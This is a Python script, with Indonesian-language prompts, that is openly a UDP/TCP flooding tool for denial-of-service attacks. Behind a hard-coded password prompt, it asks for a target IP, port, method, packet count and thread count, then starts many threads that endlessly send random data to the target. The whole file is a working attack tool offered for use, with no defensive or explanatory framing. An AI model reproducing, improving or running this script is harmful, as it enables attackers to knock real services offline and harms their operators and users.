import random
import socket
import threading
import time
import os
import sys
from time import sleep

os.system("clear")
password ="LeviUDP"

for i in range(3):
    pwd = input("[ ! ] PW NYA APA HAYO?: ")
    j=3
    if(pwd==password):
        time.sleep(5)
        print("[] SABAR 5 DETIK YE ")
        break
    else:
        time.sleep(5)
        print("[×] SALAH TOLOL PW NYA ")
        continue
time.sleep(5)
print("{} PASSWORD BENER, PINTER JUGA")
print("{•} YANG ABUSE GW DOAIN KETAUAN DDOS")

print("""
█░░ █▀ █░█ ░██░ ▄▀▀▄
█░░ █▀ █░█ █▄█▄ ▄▀▀▄
▀▀▀ ▀▀ ░▀░ ░░█░ ▀▄▄▀
| DDOS ATTACK|| UDP/TCP | JANGAN ABUSE PAOK""")


ip = str(input(" IP NYA TARUH  : "))
port = int(input(" PORT NYA TARUH : "))
choice = str(input(" METODS APA? : "))
times = int(input(" PAKET (BEBAS) : "))
threads = int(input(" THREADS (SARAN 800) : "))

def udp():
  data = random._urandom(1180)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(f"LEV ATTACKING {ip} AND PORT {port}")
    except:
      print(f"LEV ATTACKING {ip} AND PORT {port}")

def tcp():
  data = random._urandom(102498)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(f"LEV ATTACKING {ip} AND PORT {port}")
    except:
     s.close()
     print(f"LEV ATTACKING {ip} AND PORT {port}")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()